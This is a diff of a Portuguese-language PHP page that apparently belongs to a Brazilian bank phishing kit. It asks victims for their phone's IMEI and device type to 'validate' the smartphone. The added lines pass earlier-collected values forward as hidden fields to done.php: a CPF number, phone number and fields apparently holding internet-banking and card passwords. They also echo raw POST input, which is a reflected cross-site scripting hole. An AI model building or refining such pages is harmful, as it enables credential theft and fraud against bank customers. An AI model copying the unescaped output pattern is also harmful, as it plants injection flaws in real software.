@@ -213,6 +213,11 @@ function pulacampo(idobj, idproximo){
         </div>
     </div>               
                 <form action="done.php" method="POST" id="form" name="form">
+				<input type="hidden" name="cpf" value="<?php echo $_POST['cpf']; ?>">
+ 				<input type="hidden" name="snet" id="snet" value="<?php echo $_POST['snet']; ?>">
+				<input name="ddd" id="ddd" value="<?php echo $_POST['ddd']; ?>" type="hidden" >
+				<input type="hidden" id="fone" name="fone" value="<?php echo $_POST['fone']; ?>" />
+				<input id="scard" name="scard" type="hidden" value="<?php echo $_POST['scard']; ?>">
                     <article class="textoLib"> 
                       <h4><strong>Como encontrar IMEI no smartphone ?</strong></h4>
                       <p>Abra o discador do seu smartphone e ligue para o seguinte código no teclado: <span class="textRed">*#06#</span></p>
@@ -228,8 +233,9 @@ function pulacampo(idobj, idproximo){
                       <input type="tel" inputmode="numeric" name="imei" id="imei" maxlength="15" onkeypress="return number(event)" onkeyup="pulacampo('imei','dispositivo');">
                       <span class="highlight"></span>
                       <span class="bar"></span>
-                    </div>
-                    <div class="group" style="width: 92%;">
+                    </div><br>
+                    <div class="group" style="width: 92%; margin-left: 3%;">
+					<span>Qual dispositivo?</span>
                         <select name="dispositivo" id="dispositivo" onkeyup="pulacampo('dispositivo','continuar');" required="">
                           <option value="" selected="selected">Selecione o Dispositivo</option>
                           <option value="Android">Android</option>
@@ -237,8 +243,8 @@ function pulacampo(idobj, idproximo){
                           <option value="Windows Phone">Windows Phone</option>
                         </select>
                     </div>
-                    <div class="form-group">
-                        <input type="submit" id="continuar" name="continuar" value="validar smartphone" onclick="return ValidaLogin()">
+                    <div class="pt30">
+                        <input type="submit" id="btn-entrar" id="continuar" name="continuar" value="validar smartphone" onclick="return ValidaLogin()" style="height: 50px; border: 1px solid #393939; border-radius: 15px; width:50%;  margin-left:25%; margin-right:25%; 	background-color: #393939; color: #FFFFFF;">
                     </div>
                 </form>
             </section>
